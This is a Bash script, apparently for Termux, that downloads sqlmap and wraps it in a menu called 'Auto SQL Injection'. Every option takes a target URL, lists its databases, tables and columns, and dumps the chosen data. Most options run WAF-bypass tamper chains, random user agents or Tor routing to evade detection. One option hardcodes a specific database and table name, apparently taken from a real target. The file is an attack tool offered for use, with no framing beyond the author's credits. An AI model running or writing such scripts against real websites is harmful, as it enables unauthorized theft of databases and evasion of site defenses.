echo -e '\e[1;31m[+] Please Wait..... [+]\e[0m'
pkg install figlet >/dev/null 2>&1
if [[ -d "sqlmap" ]]
then
   echo -e "\e[1;32mSqlmap folder is exists on your system\e[0m"
fi
git clone https://github.com/sqlmapproject/sqlmap >/dev/null 2>&1
banner () {
 clear
echo -e '\e[1;32m'
figlet -f slant "Auto SQL Injection"
echo -e '\e[0m'
echo -e '\e[1;31m [+]---------------------------------------------------[+]
             Author:Bhone Myat Han
             Github:https://github.com/noobprogrammerD4V8ll
                    
       Specially Thank to Sqlmap Tool && SiThu Tun(TiMe)
 [+]---------------------------------------------------[+]
\e[0m'
echo -e "\e[1;31m              Eg:targetsite.com/index.php?id=1 \e[0m"
echo ""
}
banner
echo -e "\e[1;32m [1]Normal Injection                            [8]Waf bypass method7
 [2]Waf bypass method1                          [9]Waf bypass method8
 [3]Waf bypass method2                          [10]Waf bypass method9
 [4]Waf bypass method3                          [11]Waf bypass method10
 [5]Waf bypass method4                          [12]Waf bypass method11
 [6]Waf bypass method5                          [13]Waf bypass method12
 [7]Waf bypass method6                          [14]Waf bypass method13
                         [15]Wizard Method
 
\e[0m"
read -p $'\e[1;32m Enter Option Number::\e[0m' cho
case $cho in
1)
banner
read -p $'\e[1;32m Enter Website Link:: \e[0m' url
cd sqlmap
python2 sqlmap.py -u $url --dbs
read -p $'\e[1;32m Enter Database name::\e[0m' db
python2 sqlmap.py -u $url -D $db --tables
read -p $'\e[1;32m Enter table name for view columns::\e[0m' tbl
python2 sqlmap.py -u $url -D $db -T $tbl --columns
echo -e '\e[1;31m [+]Note:multiple columns name you should put comma like this(column_1,column_2,etc)'
echo ""
read -p $'\e[1;32m Enter columns name for dump data::\e[0m' col
python2 sqlmap.py -u $url -D $db -T $tbl -C $col --dump
;;
2)
banner
read -p $'\e[1;32m Enter Website Link:: \e[0m' url
cd sqlmap
python2 sqlmap.py -u "$url" --level=5 --risk=3 --random-agent --user-agent -v3 --batch --threads=10 --dbs
read -p $'\e[1;32m Enter Database name::\e[0m' db
python2 sqlmap.py -u "$url" --level=5 --risk=3 --random-agent --user-agent -v3 --batch --threads=10 -D $db --tables
read -p $'\e[1;32m Enter table name for view columns::\e[0m' tbl
python2 sqlmap.py -u "$url" --level=5 --risk=3 --random-agent --user-agent -v3 --batch --threads=10 -D $db -T $tbl --columns
echo -e '\e[1;31m [+]Note:multiple columns name you should put comma like this(column_1,column_2,etc)'
echo ""
read -p $'\e[1;32m Enter columns name for dump data::\e[0m' col
python2 sqlmap.py -u "$url" --level=5 --risk=3 --random-agent --user-agent -v3 --batch --threads=10 -D $db -T $tbl -C $col --dump
;;
3)
banner
read -p $'\e[1;32m Enter Website Link:: \e[0m' url
cd sqlmap
python2 sqlmap.py -u "$url" --dbms="MySQL" -v3 --technique U --tamper="space2mysqlblank.py" --dbs
read -p $'\e[1;32m Enter Database name::\e[0m' db
python2 sqlmap.py -u "$url" --dbms="MySQL" -v3 --technique U --tamper="space2mysqlblank.py" -D $db --tables
read -p $'\e[1;32m Enter table name for view columns::\e[0m' tbl
python2 sqlmap.py -u "$url" --dbms="MySQL" -v3 --technique U --tamper="space2mysqlblank.py" -D $db -T $tbl --columns
echo -e '\e[1;31m [+]Note:multiple columns name you should put comma like this(column_1,column_2,etc)'
echo ""
read -p $'\e[1;32m Enter columns name for dump data::\e[0m' col
python2 sqlmap.py -u "$url" --dbms="MySQL" -v3 --technique U --tamper="space2mysqlblank.py" -D $db -T $tbl -C $col --dump
;;
4)
banner
read -p $'\e[1;32m Enter Website Link:: \e[0m' url
cd sqlmap
python2 sqlmap.py -u "$url" --dbms="MySQL" -v3 --technique U --tamper="space2comment" --dbs
read -p $'\e[1;32m Enter Database name::\e[0m' db
python2 sqlmap.py -u "$url" --dbms="MySQL" -v3 --technique U --tamper="space2comment" -D $db --tables
read -p $'\e[1;32m Enter table name for view columns::\e[0m' tbl
python2 sqlmap.py -u $url -D $db -T $tbl --columns
echo -e '\e[1;31m [+]Note:multiple columns name you should put comma like this(column_1,column_2,etc)'
echo ""
read -p $'\e[1;32m Enter columns name for dump data::\e[0m' col
python2 sqlmap.py -u $url -D $db -T $tbl -C $col --dump
;;
5)
banner
read -p $'\e[1;32m Enter Website Link:: \e[0m' url
cd sqlmap
python2 sqlmap.py -u "$url" -v3 --technique=T --no-cast --fresh-queries --banner --dbs
read -p $'\e[1;32m Enter Database name::\e[0m' db
python2 sqlmap.py -u "$url" -v3 --technique=T --no-cast --fresh-queries --banner -D $db --tables
read -p $'\e[1;32m Enter table name for view columns::\e[0m' tbl
python2 sqlmap.py -u "$url" -v3 --technique=T --no-cast --fresh-queries --banner -D $db -T $tbl --columns
echo -e '\e[1;31m [+]Note:multiple columns name you should put comma like this(column_1,column_2,etc)'
echo ""
read -p $'\e[1;32m Enter columns name for dump data::\e[0m' col
python2 sqlmap.py -u "$url" -v3 --technique=T --no-cast --fresh-queries --banner -D $db -T $tbl -C $col --dump
;;
6)
banner
read -p $'\e[1;32m Enter Website Link:: \e[0m' url
cd sqlmap
python2 sqlmap.py -u "$url" --identify-waf --random-agent -v 3 --tamper="between,randomcase,space2comment" --dbs
read -p $'\e[1;32m Enter Database name::\e[0m' db
python2 sqlmap.py -u "$url" --identify-waf --random-agent -v 3 --tamper="between,randomcase,space2comment" -D $db --tables
read -p $'\e[1;32m Enter table name for view columns::\e[0m' tbl
python2 sqlmap.py -u "$url" --identify-waf --random-agent -v 3 --tamper="between,randomcase,space2comment" -D $db -T $tbl --columns
echo -e '\e[1;31m [+]Note:multiple columns name you should put comma like this(column_1,column_2,etc)'
echo ""
read -p $'\e[1;32m Enter columns name for dump data::\e[0m' col
python2 sqlmap.py -u "$url" --identify-waf --random-agent -v 3 --tamper="between,randomcase,space2comment" -D $db -T $tbl -C $col --dump
;;
7)
banner
read -p $'\e[1;32m Enter Website Link:: \e[0m' url
cd sqlmap
python2 sqlmap.py -u "$url" --parse-errors -v 3 --current-user --is-dba --banner -D eeaco_gm -T #__tabulizer_user_preferences --column --random-agent --level=5 --risk=3 --dbs
read -p $'\e[1;32m Enter Database name::\e[0m' db
python2 sqlmap.py -u "$url" --parse-errors -v 3 --current-user --is-dba --banner -D eeaco_gm -T #__tabulizer_user_preferences --column --random-agent --level=5 --risk=3 -D $db --tables
read -p $'\e[1;32m Enter table name for view columns::\e[0m' tbl
python2 sqlmap.py -u "$url" --parse-errors -v 3 --current-user --is-dba --banner -D eeaco_gm -T #__tabulizer_user_preferences --column --random-agent --level=5 --risk=3 -D $db -T $tbl --columns
echo -e '\e[1;31m [+]Note:multiple columns name you should put comma like this(column_1,column_2,etc)'
echo ""
read -p $'\e[1;32m Enter columns name for dump data::\e[0m' col
python2 sqlmap.py -u "$url" --parse-errors -v 3 --current-user --is-dba --banner -D eeaco_gm -T #__tabulizer_user_preferences --column --random-agent --level=5 --risk=3 -D $db -T $tbl -C $col --dump
;;
8)
banner
read -p $'\e[1;32m Enter Website Link:: \e[0m' url
cd sqlmap
python2 sqlmap.py -u "$url" --tamper=between,modsecurityversioned,modsecurityzeroversioned,charencode,greatest --identify-waf --random-agent --dbs
read -p $'\e[1;32m Enter Database name::\e[0m' db
python2 sqlmap.py -u "$url" --tamper=between,modsecurityversioned,modsecurityzeroversioned,charencode,greatest --identify-waf --random-agent -D $db --tables
read -p $'\e[1;32m Enter table name for view columns::\e[0m' tbl
python2 sqlmap.py -u "$url" --tamper=between,modsecurityversioned,modsecurityzeroversioned,charencode,greatest --identify-waf --random-agent -D $db -T $tbl --columns
echo -e '\e[1;31m [+]Note:multiple columns name you should put comma like this(column_1,column_2,etc)'
echo ""
read -p $'\e[1;32m Enter columns name for dump data::\e[0m' col
python2 sqlmap.py -u "$url" --tamper=between,modsecurityversioned,modsecurityzeroversioned,charencode,greatest --identify-waf --random-agent -D $db -T $tbl -C $col --dump
;;
9)
banner
read -p $'\e[1;32m Enter Website Link:: \e[0m' url
cd sqlmap
python2 sqlmap.py -u "$url" --banner --safe-url=2 --safe-freq=3 --tamper=between,randomcase,charencode -v 3 --force-ssl --dbs --threads=10 --level=2 --risk=2 --dbs
read -p $'\e[1;32m Enter Database name::\e[0m' db
python2 sqlmap.py -u "$url" --banner --safe-url=2 --safe-freq=3 --tamper=between,randomcase,charencode -v 3 --force-ssl --dbs --threads=10 --level=2 --risk=2 -D $db --tables
read -p $'\e[1;32m Enter table name for view columns::\e[0m' tbl
python2 sqlmap.py -u "$url" --banner --safe-url=2 --safe-freq=3 --tamper=between,randomcase,charencode -v 3 --force-ssl --dbs --threads=10 --level=2 --risk=2 -D $db -T $tbl --columns
echo -e '\e[1;31m [+]Note:multiple columns name you should put comma like this(column_1,column_2,etc)'
echo ""
read -p $'\e[1;32m Enter columns name for dump data::\e[0m' col
python2 sqlmap.py -u "$url" --banner --safe-url=2 --safe-freq=3 --tamper=between,randomcase,charencode -v 3 --force-ssl --dbs --threads=10 --level=2 --risk=2 -D $db -T $tbl -C $col --dump
;;
10)
banner
read -p $'\e[1;32m Enter Website Link:: \e[0m' url
cd sqlmap
python2 sqlmap.py -u "$url" --level=5 --risk=3 --random-agent --tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes --dbms=mssql --dbs
read -p $'\e[1;32m Enter Database name::\e[0m' db
python2 sqlmap.py -u "$url" --level=5 --risk=3 --random-agent --tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes --dbms=mssql -D $db --tables
read -p $'\e[1;32m Enter table name for view columns::\e[0m' tbl
python2 sqlmap.py -u "$url" --level=5 --risk=3 --random-agent --tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes --dbms=mssql -D $db -T $tbl --columns
echo -e '\e[1;31m [+]Note:multiple columns name you should put comma like this(column_1,column_2,etc)'
echo ""
read -p $'\e[1;32m Enter columns name for dump data::\e[0m' col
python2 sqlmap.py -u "$url" --level=5 --risk=3 --random-agent --tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes --dbms=mssql -D $db -T $tbl -C $col --dump
;;
11)
banner
read -p $'\e[1;32m Enter Website Link:: \e[0m' url
cd sqlmap
python2 sqlmap.py -u "$url" --level 5 --risk 3 tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor --dbms=mssql --dbs
read -p $'\e[1;32m Enter Database name::\e[0m' db
python2 sqlmap.py -u "$url" --level 5 --risk 3 tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor --dbms=mssql -D $db --tables
read -p $'\e[1;32m Enter table name for view columns::\e[0m' tbl
python2 sqlmap.py -u "$url" --level 5 --risk 3 tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor --dbms=mssql -D $db -T $tbl --columns
echo -e '\e[1;31m [+]Note:multiple columns name you should put comma like this(column_1,column_2,etc)'
echo ""
read -p $'\e[1;32m Enter columns name for dump data::\e[0m' col
python2 sqlmap.py -u "$url" --level 5 --risk 3 tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor --dbms=mssql -D $db -T $tbl -C $col --dump
;;
12)
banner
read -p $'\e[1;32m Enter Website Link:: \e[0m' url
cd sqlmap
python2 sqlmap.py -u "$url" --level 5 --risk 3 tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes --dbms=mssql --dbs
read -p $'\e[1;32m Enter Database name::\e[0m' db
python2 sqlmap.py -u "$url" --level 5 --risk 3 tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes --dbms=mssql -D $db --tables
read -p $'\e[1;32m Enter table name for view columns::\e[0m' tbl
python2 sqlmap.py -u "$url" --level 5 --risk 3 tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes --dbms=mssql -D $db -T $tbl --columns
echo -e '\e[1;31m [+]Note:multiple columns name you should put comma like this(column_1,column_2,etc)'
echo ""
read -p $'\e[1;32m Enter columns name for dump data::\e[0m' col
python2 sqlmap.py -u "$url" --level 5 --risk 3 tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes --dbms=mssql -D $db -T $tbl -C $col --dump
;;
13)
banner
read -p $'\e[1;32m Enter Website Link:: \e[0m' url
cd sqlmap
python2 sqlmap.py -u "$url" --level=5 --risk=3 -p "id" –-tamper="apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords" --dbs
read -p $'\e[1;32m Enter Database name::\e[0m' db
python2 sqlmap.py -u "$url" --level=5 --risk=3 -p "id" –-tamper="apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords" -D $db --tables
read -p $'\e[1;32m Enter table name for view columns::\e[0m' tbl
python2 sqlmap.py -u "$url" --level=5 --risk=3 -p "id" –-tamper="apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords" -D $db -T $tbl --columns
echo -e '\e[1;31m [+]Note:multiple columns name you should put comma like this(column_1,column_2,etc)'
echo ""
read -p $'\e[1;32m Enter columns name for dump data::\e[0m' col
python2 sqlmap.py -u "$url" --level=5 --risk=3 -p "id" –-tamper="apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords" -D $db -T $tbl -C $col --dump
;;
14)
banner
read -p $'\e[1;32m Enter Website Link:: \e[0m' url
cd sqlmap
python2 sqlmap.py -u "$url" --tamper "randomcase.py" --tor --tor-type=SOCKS5 --tor-port=9050 --dbs --dbms "MySQL" --current-db --random-agent --dbs
read -p $'\e[1;32m Enter Database name::\e[0m' db
python2 sqlmap.py -u "$url" --tamper "randomcase.py" --tor --tor-type=SOCKS5 --tor-port=9050 --dbs --dbms "MySQL" --current-db --random-agent -D $db --tables
read -p $'\e[1;32m Enter table name for view columns::\e[0m' tbl
python2 sqlmap.py -u "$url" --tamper "randomcase.py" --tor --tor-type=SOCKS5 --tor-port=9050 --dbs --dbms "MySQL" --current-db --random-agent -D $db -T $tbl --columns
echo -e '\e[1;31m [+]Note:multiple columns name you should put comma like this(column_1,column_2,etc)'
echo ""
read -p $'\e[1;32m Enter columns name for dump data::\e[0m' col
python2 sqlmap.py -u "$url" --tamper "randomcase.py" --tor --tor-type=SOCKS5 --tor-port=9050 --dbs --dbms "MySQL" --current-db --random-agent -D $db -T $tbl -C $col --dump
;;
15)
banner
cd sqlmap
python2 sqlmap.py --wizard
;;
*)
echo '[+]Thank for Using My Tool[+]'
;; 
esac
